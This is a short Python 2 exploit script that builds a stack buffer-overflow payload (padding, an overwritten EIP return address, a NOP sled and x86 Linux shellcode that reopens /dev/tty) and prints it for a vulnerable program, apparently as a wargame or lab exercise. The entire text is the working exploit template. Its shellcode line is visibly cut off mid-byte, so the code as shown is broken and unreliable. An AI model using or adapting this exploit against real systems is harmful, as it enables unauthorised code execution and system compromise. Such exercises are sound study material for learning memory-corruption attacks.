import struct
pad = "\x41" * 52
EIP = struct.pack("I", 0xbffff230)
shellcode = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\x$
NOP = "\x90" * 100
print pad + EIP + NOP + shellcode

